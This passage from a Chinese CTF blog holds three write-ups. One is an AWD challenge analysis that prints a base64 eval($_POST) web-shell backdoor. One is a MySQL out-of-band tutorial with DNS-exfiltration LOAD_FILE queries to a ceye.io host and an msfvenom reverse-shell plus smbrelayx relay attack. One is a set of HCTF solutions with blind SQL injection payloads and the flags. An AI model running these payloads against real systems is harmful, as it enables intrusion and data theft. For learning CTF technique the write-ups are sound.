<p>调用函数var_dump(get_defined_vars())进行反混淆，本地运行可以得到一样的源码。<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-15bd7af93d209fda.png" alt><br>这里直接贴出BXS师傅完全修复的源码：<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-8fdc8f0abaf18052.jpg" alt></p>
<h2 id="0x03-重置数据库"><a href="#0x03-重置数据库" class="headerlink" title="0x03 重置数据库"></a>0x03 重置数据库</h2><p>利用安装框架的配置文件，重置数据库这个也是迷，不过利用起来也是没有难度的，主要就看能不能找到这个页面了，估计是主办方故意留下这个页面的，利用方法，直接访问 \include\frame 目录下 index.php，直接就进入了配置页面<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-a677562380059b89.png" alt></p>
<p>跟着走一遍，重置一下网站，然后跳第一步Getshell就好。</p>
<h2 id="0x04-主办方设置的后门利用"><a href="#0x04-主办方设置的后门利用" class="headerlink" title="0x04 主办方设置的后门利用"></a>0x04 主办方设置的后门利用</h2><p>对于这个后门，调试也是到了比赛结束后，about/show.php 30、31行</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">$show_tiny=create_function(<span class="string">""</span>, base64_decode(<span class="string">'QGV2YWwoJF9QT1NUWyJpY3FjdGZlciJdKTs='</span>));</span><br><span class="line">$show_tiny();</span><br></pre></td></tr></table></figure>
<p>解base64后得到的是一个自带后门：@eval($_POST[“icqctfer”]);<br>当时在现场的时候看到这个就直接在show.php后用POST传参icqctfer=<strong>****</strong>，没有得到任何想要的结果，当时还以为大家都补了，没有注意到源码中还有限制条件，主要是在show.php中的<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!$id &amp;&amp; $class1)$id &#x3D; $class1;</span><br><span class="line">if(!is_numeric($id))okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">$show &#x3D; $db-&gt;get_one(&quot;SELECT * FROM $met_column WHERE id&#x3D;&#39;$id&#39; and module&#x3D;1&quot;);</span><br><span class="line">if(!$show||!$show[&#39;isshow&#39;])&#123;</span><br><span class="line">okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>is_numeric()函数要求变量id要是数字，这个地方比较好过，由于对$id没有做任何限制的，我们可以在本地调试测试，把变量id覆盖就好了，不过后面的查询语句也要求了id值得赋成1，payload:<a href="http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1</a><br>之后主要是$show变量的问题， $db-&gt;get_one(“SELECT * FROM $met_column WHERE id=’$id’ and module=1”)将表met_column的第一行信息以数组的方式赋值给变量show，本地查看数据库<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-640ee3a29ec2e4db.png" alt><br>其中isshow列默认值为 0<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-796a9719aa2b0afb.png" alt><br>而要过条件if(!$show||!$show[‘isshow’])只有当$show = 1或者$show[‘isshow’] = 1，而从数据库中看来使得$show = 1是不可能的，我们没法把对方的数据库id = 1的所有信息都置1，所以只有将$show[‘isshow’]置 1 。而要将变量$show[‘isshow’]置 1，需要进入Metinfo后台：设置-&gt;栏目 中修改about的参数，将 添加内容 段改成允许，就可以将isshow置为1,从而通过条件，就可以利用icqctfer了。<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-3166828be770c331.png" alt><br>那么问题来了，要想进后台修改配置利用这个后门，除非一上手在别人没改密码之前进入别人后台修改，等大家都把后台密码改了，也就只有通过重置数据库的方法进入后台，既然后重置数据库进入后台了，还不如上传木马来打，所以这个后门看似简单，其实用起来太麻烦，价值也不高。</p>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>本菜因才疏学浅，只挖到了部分的洞，因为上次在场上的时候有师傅直接把网站页面给改写了，说明还有其他的利用点，这里膜一下，本文章只用来学习记录。</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>AWD</tag>
        <tag>cms</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>一道题目引发的MySQL-Out-of-Band学习笔记</title>
    <url>/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>研究这个攻击方式主要是因为在近期的HCTF上遇到了这个漏洞点，之前一直没有什么时间来了解mysql，所以遇到的时候有点懵，不过题目考点只是OOB的一部分，所以花点时间把oob了解的深刻一点。</p>
<p>##0x01 什么是 Out-of-Band 注入<br> 讲得通俗一点就是通过其他方式来提取mysql数据，也就是带外攻击，比如可以通过DNS解析，HHTP，文件系统等</p>
<h2 id="0x02-MySQL的限制"><a href="#0x02-MySQL的限制" class="headerlink" title="0x02 MySQL的限制"></a>0x02 MySQL的限制</h2><p>oob攻击主要是针对MySQL 5.5.53以及之前的版本，在MySQL中存在一个全局变量：secure_file_priv,主要是用来限制数据写入和写出的，在5.5.53版本之前，变量的默认value是空，例如本次我测试的环境：<img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-722d423dcb8ab1f3.png" alt></p>
<p>而5.5.53版本后secure_file_priv变量默认值为NULL，即我们不可以利用该变量进行数据写入写出操作，但有时有需要用到写入写出功能的时候，可以将secure_file_priv变量设置为空，例如，在my.ini中直接插入一条：secure_file_priv=     即可。</p>
<h2 id="0x03-利用INTO-OUTFILE等语句写出数据"><a href="#0x03-利用INTO-OUTFILE等语句写出数据" class="headerlink" title="0x03 利用INTO OUTFILE等语句写出数据"></a>0x03 利用INTO OUTFILE等语句写出数据</h2><p>利用INTO OUTFILE等语句可以将查询信息写出到文件中<br>windows下测试：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">select @@version into outfile <span class="string">'H:\\test.txt'</span>;</span><br><span class="line">select @@version into dumpfile <span class="string">'H:\\test.txt'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-a07ddf60fed054ea.png" alt></p>
<h2 id="0x04-DNS解析获取数据"><a href="#0x04-DNS解析获取数据" class="headerlink" title="0x04 DNS解析获取数据"></a>0x04 DNS解析获取数据</h2><p>我们使用load_file()语句将数据信息导出到外部服务器上，例如DNS解析器，但mysql尝试解析DNF时，我们就可以在DNS解析式上获取到查询数据信息，这里贴一个DNS解析的API：<a href="http://ceye.io/records/dns" target="_blank" rel="noopener">http://ceye.io/records/dns</a><br>查询语句例如：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(<span class="string">'\\\\'</span>,version(),<span class="string">'.mysql.ip.port.8cs2vs.ceye.io\\abc'</span>));</span><br></pre></td></tr></table></figure>
<p>我们可以在DNS接口处看到成功获取到查询数据<br><img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-49b29c165bd155a2.png" alt></p>
<h2 id="0x05-SMB中继攻击"><a href="#0x05-SMB中继攻击" class="headerlink" title="0x05 SMB中继攻击"></a>0x05 SMB中继攻击</h2><p>这个攻击方式主要是利用mysql服务器通过load_file、into outfile/dumpfile、load data infile等函数向主机连接通信的时候（描述不一定准确），使用smbrelayx等工具将反向shell上传到主机中。smbrelayx工具下载地址：<a href="https://github.com/coresecurity/impacket" target="_blank" rel="noopener">https://github.com/coresecurity/impacket</a><br>利用kaili生成反向连接shell（win7环境）：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">172.20</span>.<span class="number">10.5</span> LPORT=<span class="number">443</span>  -f exe &gt; win64.exe</span><br></pre></td></tr></table></figure>
<p>启用smbrelayx.py</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">smbrelayx.py -h [攻击主机ip] -e ./win64.exe</span><br></pre></td></tr></table></figure>
<p>Metasploit上启用multi/handler模块，设置好payload，lhost，lport，在MySQL服务器上执行：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">select load_file(<span class="string">'\\\\172.20.10.5\\test'</span>);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>即可发起smb中继攻击，从而反向Getshell，由于MySQL版本的原因，此攻击利用率较低，不过也不乏有少数管理员将secure_file_priv变量开启利用，或者MySQL没有及时更新升级。</p>
<h2 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h2><p><a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="noopener">Osanda Malith Jayathissa</a></p>
<p><strong>文章只用于个人学习记录</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>Out-of-Band</tag>
      </tags>
  </entry>
  <entry>
    <title>两天做了HCTF的最简单的题</title>
    <url>/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<h3 id="0x00-poker2"><a href="#0x00-poker2" class="headerlink" title="0x00 poker2"></a>0x00 poker2</h3><p>这两天真的是沉迷游戏，不能自拔，刚开始进入游戏的时候，发现同目录有flag.php，要求游戏升到100级，就可以得到flag，那就是刷级了，结果一注册，发现送了成长礼包（后来才发现原来其他人没有），直接飙到90级，占据全服第一的位置一个上午。这题就是抓包重复刷怪就好了，只知道圣诞小屋经验高。这里直接贴脚本了</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-2249f408b45e1c33.png" alt></p>
<p>简单的刷分脚本                                        </p>
<p>到了100级后到flag.php就直接得到flag：hctf{Go0dLuck_toGetTheFl3g__from_game}</p>
<p><strong>boring website</strong></p>
<p>扫描发现有<a href="http://www.zip，里面有index.php的源码" target="_blank" rel="noopener">www.zip，里面有index.php的源码</a></p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-3cf59e70e00511d7.png" alt>                                   </p>
<p>注入点很明显，就是在参数id那，数据库密码 ‘oob’ 提示这道题是MySQL Out-of-Band攻击，再加上注释的 //link server: On  linkname:mysql，目标数据库是SQL Server的，所以这里要用到OpenQuery表达式：OPENQUERY (  linked_server ,’query’ )，由于过滤了敏感字符，没法得到回显，主要参考文章：</p>
<p><a href="http://bobao.360.cn/learning/detail/3458.html，发现可以利用DNS解析提取数据，例如：select" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3458.html，发现可以利用DNS解析提取数据，例如：select</a>  load_file(concat(‘\’,version(),’.hacker.site\a.txt’));所以构造payload：id=1; select * from OpenQuery(mysql,’SELECT LOAD_FILE(CONCAT(“\”,(select  1),”.mysql.ip.port.8cs2vs.ceye.io\abc”))’);</p>
<p>在DNS解析平台可以得到反馈数据，那么就下来就是把(select 1)改成查库，查表，查字段/内容的语句就好了,主要还是学习了oob攻击一波，这里直接贴图：</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-e8fd0904e57cdc6f.png" alt></p>
<p>得到flag：hctf{dn5-1og-can-take-f14g-6as84f}</p>
<h3 id="0x01-poker-poker"><a href="#0x01-poker-poker" class="headerlink" title="0x01 poker-poker"></a>0x01 poker-poker</h3><p>打开发现和level 2里的poker2是一样的，那就是一道题两个flag，在做level 2  的时候，就尝试过很多方法，抓包的时候发现带有很多参数，所以把包后甩sqlmap里跑了一下，在注册处的包有报存在注入，但是sqlmap都没法跑出来，带着测试一波的心理开始手动测试，发现username参数可以进行时间盲注，没有过滤，直接构造payload：</p>
<p>?bc=2&amp;bname=easdasd&amp;head=6&amp;pass=&amp;sex=2&amp;username= ’ and if( (ascii(substr((select database()),1))&gt;97),sleep(5)1)–+</p>
<p>发现不仅可以时间，还可以直接判断返回值来注，可以构造payload：</p>
<p>?bc=2&amp;bname=easdasd&amp;head=6&amp;pass=&amp;sex=2&amp;username=11111 ’ and if( (ascii(substr((select database()),1))&gt;97),0,1)–+  进行注入（这样写脚本方便点）</p>
<p>这里必须补充写下，直接查库是pm_hctf，查到第一个表是PasswordProtection</p>
<p>看到题目是的pspt，心里有点小高兴，结果花了好几个小时，把pm_hctf库下100多个表名都看了一遍，发现没有和flag有关的啊，最后重新查了下其他库，有个hctf，flag2表，真的是一把幸酸泪啊，直接贴脚本：</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-dcb4fcdd43d1eead.png" alt>                                      </p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-401387e4b93a4c11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>得到flag：hctf{y3u_G0t_tHe__poker_game}</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>逻辑</tag>
      </tags>
  </entry>
</search>
